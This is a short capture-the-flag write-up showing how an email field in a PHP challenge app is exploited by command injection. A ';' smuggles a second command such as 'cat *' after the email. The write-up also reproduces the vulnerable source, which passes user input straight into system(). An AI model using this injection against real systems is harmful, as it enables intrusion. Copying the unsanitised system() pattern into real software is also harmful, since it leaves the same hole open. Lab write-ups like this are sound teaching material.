## challenge description `the administrator put the backup file in the same root folder as the application, help us download this backup by retrieving the backup file name`

## we have an input field which takes an email as input , the string must contain `@` and `.` that is the backend validation  
![Screenshot_20230801_181905](https://github.com/kiro6/writeups-ctfs/assets/57776872/156e4d9d-50a1-4a20-8595-93bdbea99f57)

## i tried command injection since we want to get the file name in the root dir , so i begin to detect by injecting `;` after the email 
![Screenshot_20230801_182101](https://github.com/kiro6/writeups-ctfs/assets/57776872/dbf8d1a3-bf65-4412-9de6-453817fc0789)


## my email appeared in the top of the page , lets try to inject a command `cat *`
![Screenshot_20230801_183323](https://github.com/kiro6/writeups-ctfs/assets/57776872/12400d74-164f-4e64-87a0-3a840da84eb6)

## to understand how the vulnerability arise we can read the php source code which we get in the response 
```php
<?php

if(isset($_POST['email'])){
    $email = $_POST['email'];
    $pass = 1;
    if(!strstr($email,'@')){
        echo '<div class="alert alert-danger">invalid email , email must contain @ & dot</div>';
        $pass = 0;
    }
    if(!strstr($email,'.') && $pass==1){
        echo '<div class="alert alert-danger">invalid email , email must contain @ & dot</div>';
        $pass = 0;
    }

    if($pass){
        $command = "echo $email >> emails_secret_1337.txt";
        //echo $command;
        try {
            system($command);
        } catch (Exception $e) {
            print_r($e->getMessage());
        }
        echo '<div class="alert alert-success   ">Your email inserted successfully</div>';
    }
}
?>
```

## we have the backupfile name which is the flag
```
hgdr64.backup.tar.gz
```
